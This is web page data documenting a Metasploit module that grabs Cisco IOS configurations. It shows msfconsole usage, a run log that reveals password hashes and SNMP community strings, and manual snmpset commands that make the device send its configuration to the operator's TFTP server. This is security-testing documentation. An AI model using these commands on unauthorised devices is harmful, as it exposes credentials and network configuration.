{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/snmp/cisco_config_tftp","result":{"data":{"moduleMetadataJson":{"id":"452697d6-f5c8-56d0-9679-8ba2292ec785","name":"Cisco IOS SNMP Configuration Grabber (TFTP)","fullname":"auxiliary/scanner/snmp/cisco_config_tftp","description":"This module will download the startup or running configuration\n        from a Cisco IOS device using SNMP and TFTP. A read-write SNMP\n        community is required. The SNMP community scanner module can\n        assist in identifying a read-write community. The target must\n        be able to connect back to the Metasploit system and the use of\n        NAT will cause the TFTP transfer to fail.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/snmp/cisco_config_tftp","documentationSlug":"/modules/documentation/auxiliary/scanner/snmp/cisco_config_tftp","referencesSlug":"/modules/references/auxiliary/scanner/snmp/cisco_config_tftp"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Cisco IOS devices can be configured to back-up their running and startup configurations via SNMP.\nThis is a well <a href=\"https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#copying_startup\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">documented</a>\nfeature of IOS and many other networking devices, and is part of an administrator functionality.\nA read-write community string is required, as well as a tftp server (metasploit includes one).\nAfter the config has been copied, the SNMP paramters are deleted.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Enable SNMP with a read/write community string on IOS: <code class=\"language-text\">snmp-server community private rw</code></li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/snmp/cisco_config_tftp</code></li>\n<li>Do: <code class=\"language-text\">set COMMUNITY [read-write snmp]</code></li>\n<li>Do: <code class=\"language-text\">set rhosts [ip]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>COMMUNITY</strong></p>\n<p>  The SNMP community string to use which must be read-write.  Default is <code class=\"language-text\">public</code>.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"cisco-uc520-8u-4fxo-k9-running-ios-124\" style=\"position:relative;\"><a href=\"#cisco-uc520-8u-4fxo-k9-running-ios-124\" aria-label=\"cisco uc520 8u 4fxo k9 running ios 124 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cisco UC520-8U-4FXO-K9 running IOS 12.4</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; setg rhosts 2.2.2.2\nrhosts =&gt; 2.2.2.2\nmsf5 &gt; use auxiliary/scanner/snmp/cisco_config_tftp\nmsf5 auxiliary(scanner/snmp/cisco_config_tftp) &gt; set community private\ncommunity =&gt; private\nmsf5 auxiliary(scanner/snmp/cisco_config_tftp) &gt; run\n\n[*] Starting TFTP server...\n[*] Scanning for vulnerable targets...\n[*] Trying to acquire configuration from 2.2.2.2...\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Providing some time for transfers to complete...\n[*] Incoming file from 2.2.2.2 - 2.2.2.2.txt 22831 bytes\n[+] 2.2.2.2:161 MD5 Encrypted Enable Password: $1$TF.y$3E7pZ2szVvQw5JG8SDjNa1\n[+] 2.2.2.2:161 Username &#39;cisco&#39; with MD5 Encrypted Password: $1$DaqN$iP32E5WcOOui/H66R63QB0\n[+] 2.2.2.2:161 SNMP Community (RO): public\n[+] 2.2.2.2:161 SNMP Community (RW): private\n[*] Shutting down the TFTP service...\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"manual-interaction\" style=\"position:relative;\"><a href=\"#manual-interaction\" aria-label=\"manual interaction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Manual Interaction</h3>\n<p>This process can also be executed manually utilizing Metasploit's TFTP server.\nCisco's <a href=\"https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/15217-copy-configs-snmp.html#copying_startup\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">documentation</a>\nwas utilized to create this process.</p>\n<ol>\n<li>Start the TFTP server</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use auxiliary/server/tftp \nmsf5 auxiliary(server/tftp) &gt; run\n[*] Auxiliary module running as background job 0.\nmsf5 auxiliary(server/tftp) &gt; \n[*] Starting TFTP server on 0.0.0.0:69...\n[*] Files will be served from /tmp\n[*] Uploaded files will be saved in /tmp</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"2\">\n<li>Execute the SNMP commands.  An integer is required to group the requests together, <code class=\"language-text\">666</code> is used in this example.</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(server/tftp) &gt; snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.2.666 i 1 \n[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.2.666 i 1 \n\niso.3.6.1.4.1.9.9.96.1.1.1.1.2.666 = INTEGER: 1\nmsf5 auxiliary(server/tftp) &gt; snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.666 i 4 \n[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.666 i 4 \n\niso.3.6.1.4.1.9.9.96.1.1.1.1.3.666 = INTEGER: 4\nmsf5 auxiliary(server/tftp) &gt; snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.666 i 1 \n[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.666 i 1 \n\niso.3.6.1.4.1.9.9.96.1.1.1.1.4.666 = INTEGER: 1\nmsf5 auxiliary(server/tftp) &gt; snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.666 a &quot;1.1.1.1&quot; \n[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.666 a &quot;1.1.1.1&quot; \n\niso.3.6.1.4.1.9.9.96.1.1.1.1.5.666 = IpAddress: 1.1.1.1\nmsf5 auxiliary(server/tftp) &gt; snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.6.666 s &quot;backup_config&quot; \n[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.6.666 s &quot;backup_config&quot; \n\niso.3.6.1.4.1.9.9.96.1.1.1.1.6.666 = STRING: &quot;backup_config&quot;\nmsf5 auxiliary(server/tftp) &gt; snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 1 \n[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 1 \n\niso.3.6.1.4.1.9.9.96.1.1.1.1.14.666 = INTEGER: 1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"3\">\n<li>At this point the config is transferring, we need to wait a few seconds.  Lastly, we'll remove <code class=\"language-text\">666</code> from the system.</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(server/tftp) &gt; snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 6\n[*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 6\n\niso.3.6.1.4.1.9.9.96.1.1.1.1.14.666 = INTEGER: 6</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"4\">\n<li>Confirm we have our config file</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(server/tftp) &gt; ls -lah /tmp/backup_config\n[*] exec: ls -lah /tmp/backup_config\n\n-rw-r--r-- 1 root root 23K Oct 11 22:20 /tmp/backup_config</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"confirming-using-nmap\" style=\"position:relative;\"><a href=\"#confirming-using-nmap\" aria-label=\"confirming using nmap permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Confirming using NMAP</h2>\n<p>Utilizing the <a href=\"https://nmap.org/nsedoc/scripts/snmp-ios-config.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">snmp-ios-config</a> script</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">nmap -sU -p 161 --script snmp-ios-config --script-args creds.snmp=:private 192.168.2.239\nStarting Nmap 7.70 ( https://nmap.org ) at 2018-10-11 22:30 EDT\nNmap scan report for 192.168.2.239\nHost is up (0.0034s latency).\n\nPORT    STATE SERVICE\n161/udp open  snmp\n| snmp-ios-config: \n| !\n| ! Last configuration change at 18:01:46 PST Fri Jan 7 2000 by cisco\n| ! NVRAM config last updated at 06:07:55 PST Tue Jan 4 2000 by cisco\n| !\n| version 12.4\n| parser config cache interface\n| no service pad\n| service timestamps debug datetime msec\n| service timestamps log datetime msec\n| no service password-encryption\n| service internal\n| service compress-config\n| service sequence-numbers\n| !\n| hostname UC520\n...sip...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"452697d6-f5c8-56d0-9679-8ba2292ec785"}}}